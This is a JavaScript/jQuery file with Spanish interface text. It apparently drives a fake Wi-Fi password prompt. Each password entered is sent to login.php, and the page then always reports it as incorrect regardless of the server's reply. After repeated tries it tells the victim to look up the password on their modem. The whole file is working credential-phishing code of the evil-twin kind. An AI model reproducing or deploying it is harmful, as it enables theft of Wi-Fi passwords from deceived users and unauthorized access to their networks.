let contador_de_intentos = 0

$('#form_wifi').submit(function(e) {
    e.preventDefault();
    if(validate()){
        $.ajax({
                type:"post",
                dataType:"json",
                url: 'login.php',
                data: {password: $('#input_password').val()
            },
            beforeSend : function (){
                enable(false)
            },
            success: function(data) {
                enable(true)
            },
            error: function(data) {
                enable(true)
            },
        });
    }
});

function validate(){
    let error_message = ''
    if ($('#input_password').val().trim().length == 0) {
        error_message += 'La contraseña no puede estar vacía.'
    }

    if(error_message != ''){
        $('#alert_error_msg').text(error_message)
        $('#mensaje_error').removeClass('d-none')
        return false
    }else{
        return true
    }
}

function enable(enable){
    if (enable) {
        if(contador_de_intentos >= 2){
            $('#alert_error_msg').text('Si no recuerdas la contraseña puedes consultarla en tu modem, si la cambiaste puedes reiniciarlo a valores de fabrica.')
        }else{
            $('#alert_error_msg').text('Error la contraseña es incorrecta, por favor intente de nuevo.')
        }
        contador_de_intentos += 1
        setTimeout(() => {
            $('#loader').addClass('d-none')
            $('#submit_button').removeClass('d-none')
            $('#mensaje_error').removeClass('d-none')
            $('#input_password').val('')
        }, 10000);        
    }else{
        $('#loader').removeClass('d-none')
        $('#submit_button').addClass('d-none')
        $('#mensaje_error').addClass('d-none')
    }
}